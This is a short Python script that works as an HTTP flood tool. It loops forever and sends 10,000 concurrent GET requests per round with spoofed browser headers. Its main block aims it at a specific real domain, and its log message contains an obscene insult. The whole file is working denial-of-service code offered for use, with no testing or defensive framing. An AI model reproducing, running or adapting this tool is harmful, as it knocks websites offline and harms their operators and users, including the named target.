import asyncio
import random

import logging
from aiohttp import ClientSession
from fake_headers import Headers


class Loader:
    def __init__(self, targets):
        self.targets = targets
        self.headers = Headers(headers=True)
        self.treads = 10_000

    def start(self):
        while True:
            target = random.choice(self.targets)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            future = asyncio.ensure_future(self._run(target["url"]))
            loop.run_until_complete(future)

    async def _run(self, url):
        tasks = []
        sem = asyncio.Semaphore(self.treads)
        async with ClientSession() as session:
            for i in range(self.treads):
                task = asyncio.ensure_future(
                    self.bound_fetch(sem, url.format(i), session)
                )
                tasks.append(task)
            responses = asyncio.gather(*tasks)
            await responses

    async def fetch(self, url, session):
        try:
            async with session.get(
                f"https://{url}", headers=self.headers.generate()
            ) as response:
                delay = response.headers.get("DELAY")
                logging.info(f'[PortFiller] IDI NAHUI {response.url} {delay}')
                return await response.read()
        except Exception as ex:
            print(f"[PortFiller] {url} {ex}")

    async def bound_fetch(self, sem, url, session):
        async with sem:
            await self.fetch(url, session)


if __name__ == "__main__":
    Loader([{"url": "mashabear.ru"}]).start()
